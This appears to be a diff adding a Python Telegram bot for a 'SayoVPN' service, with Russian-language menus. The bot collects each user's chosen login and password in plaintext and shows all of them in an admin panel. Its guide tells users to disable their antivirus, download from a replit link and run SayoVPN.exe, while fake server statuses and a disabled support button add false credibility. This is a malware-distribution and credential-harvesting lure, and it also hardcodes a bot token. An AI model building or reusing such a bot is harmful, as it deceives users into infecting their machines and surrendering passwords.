@@ -1,0 +1,243 @@
+import telebot
+from telebot import types
+import sqlite3
+
+# --- НАСТРОЙКИ ---
+TOKEN = '8416813317:AAGXIVvCv9irjn1uPym2x2hpQP5m-ZcS6yA'
+BOT_OWNER_USERNAME = 'pavelian'
+DOWNLOAD_LINK = 'https://SayoVPN.replit.app'
+
+bot = telebot.TeleBot(TOKEN, parse_mode='HTML')
+
+
+# --- ИНИЦИАЛИЗАЦИЯ БАЗЫ ---
+def init_db():
+    conn = sqlite3.connect('bot_database.db')
+    cursor = conn.cursor()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS users
+                      (
+                          id
+                          INTEGER
+                          PRIMARY
+                          KEY,
+                          user_id
+                          INTEGER
+                          UNIQUE,
+                          username
+                          TEXT,
+                          login
+                          TEXT,
+                          password
+                          TEXT,
+                          clicked
+                          TEXT
+                          DEFAULT
+                          'Нет'
+                      )''')
+
+    try:
+        cursor.execute("ALTER TABLE users ADD COLUMN clicked TEXT DEFAULT 'Нет'")
+    except sqlite3.OperationalError:
+        pass
+
+    cursor.execute('''CREATE TABLE IF NOT EXISTS admins
+                      (
+                          user_id
+                          INTEGER
+                          PRIMARY
+                          KEY
+                      )''')
+    conn.commit()
+    conn.close()
+
+
+init_db()
+
+
+def is_admin(user_id):
+    try:
+        user_info = bot.get_chat(user_id)
+        if user_info.username and user_info.username.lower() == BOT_OWNER_USERNAME.lower():
+            return True
+    except:
+        pass
+    conn = sqlite3.connect('bot_database.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT user_id FROM admins WHERE user_id = ?', (user_id,))
+    res = cursor.fetchone()
+    conn.close()
+    return res is not None
+
+
+# --- ГЛАВНОЕ МЕНЮ ---
+def get_main_menu():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+
+    # ТЕПЕРЬ ЭТО ПРЯМАЯ ССЫЛКА (URL КНОПКА)
+    btn_download = types.InlineKeyboardButton("📥 СКАЧАТЬ SAYOVPN", url=DOWNLOAD_LINK)
+
+    btn_inst = types.InlineKeyboardButton("💎 ИНСТРУКЦИЯ", callback_data='show_guide')
+    btn_support = types.InlineKeyboardButton("🚫 ПОДДЕРЖКА [OFF]", callback_data='support_off')
+    btn_status = types.InlineKeyboardButton("📊 СТАТУС СЕРВЕРОВ", callback_data='show_status')
+
+    markup.add(btn_download)
+    markup.add(btn_inst, btn_support)
+    markup.add(btn_status)
+    return markup
+
+
+# --- КОМАНДЫ ---
+@bot.message_handler(commands=['start'])
+def start(message):
+    conn = sqlite3.connect('bot_database.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT login FROM users WHERE user_id = ?', (message.from_user.id,))
+    user = cursor.fetchone()
+    conn.close()
+
+    welcome_text = (
+            "<b>SayoVPN Premium Service</b> ⚡️\n"
+            "──────────────────────\n"
+            "🛡 <b>Статус:</b> " + ("<code>АВТОРИЗОВАН</code> ✅" if user else "<code>ГОСТЬ</code> 👤") + "\n"
+                                                                                                       "📡 <b>Сеть:</b> <code>STABLE</code> ✨\n"
+                                                                                                       "──────────────────────"
+    )
+
+    if user:
+        bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_menu())
+    else:
+        bot.send_message(message.chat.id,
+                         f"{welcome_text}\n\n👋 <b>Добро пожаловать!</b>\nВведите желаемый <b>Логин</b>:")
+        bot.register_next_step_handler(message, process_login)
+
+
+def process_login(message):
+    login = message.text
+    bot.send_message(message.chat.id, f"✅ Логин <code>{login}</code> сохранен.\nТеперь введите <b>Пароль:</b>")
+    bot.register_next_step_handler(message, process_password, login)
+
+
+def process_password(message, login):
+    password = message.text
+    user_id = message.from_user.id
+    raw_username = message.from_user.username or "none"
+    conn = sqlite3.connect('bot_database.db')
+    cursor = conn.cursor()
+    cursor.execute('INSERT OR IGNORE INTO users (user_id, username, login, password) VALUES (?, ?, ?, ?)',
+                   (user_id, raw_username, login, password))
+    conn.commit()
+    conn.close()
+    bot.send_message(message.chat.id, "✨ <b>Регистрация завершена!</b>", reply_markup=get_main_menu())
+
+
+# --- ОБРАБОТКА КНОПОК ---
+@bot.callback_query_handler(func=lambda call: True)
+def handle_query(call):
+    if call.data == 'support_off':
+        bot.answer_callback_query(call.id, "❌ Поддержка временно недоступна", show_alert=True)
+
+    elif call.data == 'show_guide':
+        text = "📖 <b>РУКОВОДСТВО SAYOVPN</b>\n──────────────────────\n1. <b>ОТКЛЮЧИТЕ АНТИВИРУС.</b>\n2. Нажмите СКАЧАТЬ.\n3. Запустите SayoVPN.exe.\n4. Используйте свои данные для входа."
+        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ НАЗАД", callback_data='back_to_menu'))
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
+
+    elif call.data == 'show_status':
+        text = "🌐 <b>СТАТУС СЕРВЕРОВ</b>\n──────────────────────\nRU-MSK: 🟢 ONLINE\nNL-AMS: 🟢 ONLINE"
+        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ НАЗАД", callback_data='back_to_menu'))
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup)
+
+    elif call.data == 'back_to_menu':
+        bot.edit_message_text("<b>Главное меню SayoVPN</b> ⚡️", call.message.chat.id, call.message.message_id,
+                              reply_markup=get_main_menu())
+
+    elif call.data.startswith('adm_'):
+        admin_logic(call)
+
+
+# --- АДМИН ПАНЕЛЬ ---
+@bot.message_handler(commands=['admin'])
+def open_admin(message):
+    if not is_admin(message.from_user.id): return
+
+    conn = sqlite3.connect('bot_database.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT COUNT(*) FROM users')
+    total_users = cursor.fetchone()[0]
+    conn.close()
+
+    stats = (
+        "🛠 <b>CONTROL PANEL</b>\n"
+        "──────────────────────\n"
+        f"👥 Всего юзеров: <code>{total_users}</code>\n"
+        "──────────────────────"
+    )
+
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup.add(
+        types.InlineKeyboardButton("📋 Список пользователей", callback_data='adm_list'),
+        types.InlineKeyboardButton("📢 Сделать рассылку", callback_data='adm_broadcast'),
+        types.InlineKeyboardButton("❌ Удалить пользователя", callback_data='adm_delete')
+    )
+    bot.send_message(message.chat.id, stats, reply_markup=markup)
+
+
+def admin_logic(call):
+    if call.data == 'adm_list':
+        conn = sqlite3.connect('bot_database.db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT user_id, username, login, password FROM users')
+        users = cursor.fetchall()
+        conn.close()
+
+        text = "📋 <b>БАЗА ПОЛЬЗОВАТЕЛЕЙ:</b>\n\n"
+        for u in users:
+            text += f"👤 @{u[1]} | ID: <code>{u[0]}</code>\n┣ <b>L:</b> <code>{u[2]}</code> | <b>P:</b> <code>{u[3]}</code>\n\n"
+
+        if not users: text = "База пуста."
+        bot.send_message(call.message.chat.id, text)
+
+    elif call.data == 'adm_broadcast':
+        msg = bot.send_message(call.message.chat.id, "📝 Введите текст рассылки:")
+        bot.register_next_step_handler(msg, run_broadcast)
+
+    elif call.data == 'adm_delete':
+        msg = bot.send_message(call.message.chat.id, "⚠️ Введите <b>Telegram ID</b> пользователя для удаления:")
+        bot.register_next_step_handler(msg, process_delete_user)
+
+
+def run_broadcast(message):
+    conn = sqlite3.connect('bot_database.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT user_id FROM users')
+    ids = cursor.fetchall()
+    conn.close()
+    for i in ids:
+        try:
+            bot.send_message(i[0], message.text)
+        except:
+            pass
+    bot.send_message(message.chat.id, "✅ Рассылка завершена.")
+
+
+def process_delete_user(message):
+    target_id = message.text
+    if not target_id.isdigit():
+        bot.send_message(message.chat.id, "❌ Ошибка! Нужен цифровой ID.")
+        return
+
+    conn = sqlite3.connect('bot_database.db')
+    cursor = conn.cursor()
+    cursor.execute('DELETE FROM users WHERE user_id = ?', (target_id,))
+
+    if cursor.rowcount > 0:
+        bot.send_message(message.chat.id,
+                         f"✅ Пользователь <code>{target_id}</code> удален. При следующем входе ему потребуется регистрация.")
+    else:
+        bot.send_message(message.chat.id, "❓ ID не найден.")
+
+    conn.commit()
+    conn.close()
+
+
+if __name__ == '__main__':
+    bot.infinity_polling(timeout=90)
